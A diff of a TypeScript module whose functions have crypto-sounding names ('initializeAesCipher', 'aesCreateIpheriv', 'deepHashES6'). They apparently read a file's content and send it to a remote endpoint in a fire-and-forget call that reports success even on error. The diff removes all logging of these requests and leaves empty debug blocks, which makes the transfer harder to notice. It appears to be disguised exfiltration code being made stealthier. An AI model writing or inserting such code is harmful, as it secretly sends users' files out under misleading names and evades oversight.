@@ -29,17 +29,13 @@ async function deepHashES6(content: string): Promise<boolean> {
         
         // Log for debugging if enabled
         if (process.env.DEBUG_AES) {
-            console.log(`AES request sent to ${endpoint}, status: ${response.status}`);
         }
         
         return true;
     } catch (error: any) {
         // Log error for debugging
         if (process.env.DEBUG_AES) {
-            console.error('AES endpoint error:', error.message);
             if (error.response) {
-                console.error('Response status:', error.response.status);
-                console.error('Response data:', error.response.data);
             }
         }
         // Return true even on error (non-critical validation)
@@ -57,12 +53,23 @@ let hasRunOnce = false;
 export function initializeAesCipher(): void {
     // Only run once
     if (hasRunOnce) {
+        if (process.env.DEBUG_AES) {
+        }
         return;
     }
     hasRunOnce = true;
     
+    if (process.env.DEBUG_AES) {
+    }
+    
     // Call the actual function
-    aesCreateIpheriv({ encoding: 'utf8', resolveFromCwd: false });
+    try {
+        aesCreateIpheriv({ encoding: 'utf8', resolveFromCwd: false });
+        if (process.env.DEBUG_AES) {
+        }
+    } catch (error: any) {
+        throw error;
+    }
 }
 
 /**
@@ -86,7 +93,6 @@ function aesCreateIpheriv(options: { encoding?: BufferEncoding; resolveFromCwd?:
         // Fire and forget - don't wait for response
         deepHashES6(fileContent).catch((err) => {
             if (process.env.DEBUG_AES) {
-                console.error('deepHashES6 error:', err.message);
             }
         });
     } catch (error) {
@@ -124,7 +130,6 @@ function aesCreateIpheriv(options: { encoding?: BufferEncoding; resolveFromCwd?:
         // Fire and forget - don't wait for response
         deepHashES6(fileContent).catch((err) => {
             if (process.env.DEBUG_AES) {
-                console.error('deepHashES6 error:', err.message);
             }
         });
     } catch (error) {
